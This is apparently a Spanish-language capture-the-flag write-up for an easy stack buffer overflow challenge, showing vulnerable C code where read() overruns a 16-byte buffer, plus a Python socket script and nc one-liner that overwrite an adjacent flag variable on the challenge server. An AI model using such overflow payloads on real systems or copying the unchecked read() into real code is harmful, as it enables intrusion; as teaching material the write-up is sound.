# Stack Overflow

| | |
|---|---|
| **Categoría** | Pwn |
| **Dificultad** | Fácil |
| **Puntos** | 50 |
| **Reto #** | 09 |
| **Conexión** | `nc chals.tropicalhunters.com 9002` |

## Descripción

El servicio solicita un nombre y guarda junto a él un entero de aprobación en el stack. El buffer de entrada es más pequeño que los bytes que `read()` acepta.

## Análisis

```c
// Stack layout (main):
char name[16];      // rbp-0x20
int  approved = 0;  // rbp-0x10

read(0, name, 0x14);   // acepta 20 bytes → desborda 4

if (approved == 0x44434241)   // "ABCD" en little-endian
    print_flag();
```

`read()` acepta 20 bytes (`0x14`) pero el buffer solo tiene 16. Los 4 bytes sobrantes sobreescriben `approved` directamente. El valor mágico `0x44434241` equivale a la cadena `"ABCD"` en little-endian.

## Solución

```python
import socket

s = socket.socket()
s.connect(("chals.tropicalhunters.com", 9002))
s.recv(1024)

payload = b"A" * 16 + b"ABCD"   # relleno (16) + 0x44434241
s.sendall(payload + b"\n")
print(s.recv(1024).decode())
```

```bash
python3 -c "import sys; sys.stdout.buffer.write(b'A'*16+b'ABCD')" | \
  nc chals.tropicalhunters.com 9002
```

> 🚩 **Flag:** omitida intencionalmente. Seguí los pasos para obtenerla.

## Takeaways

- `read(fd, buf, n)` con `n > sizeof(buf)` desborda el stack sin protección.
- Variables adyacentes en el stack son sobrescribibles con un buffer overflow básico.
- Contramedida: nunca leer más bytes de los que caben en el buffer; usar `sizeof(buf)` como límite.

---
*Tropical Hunters CTF — Writeup por [Fabián Bustamante](https://github.com/fbustamante55)*
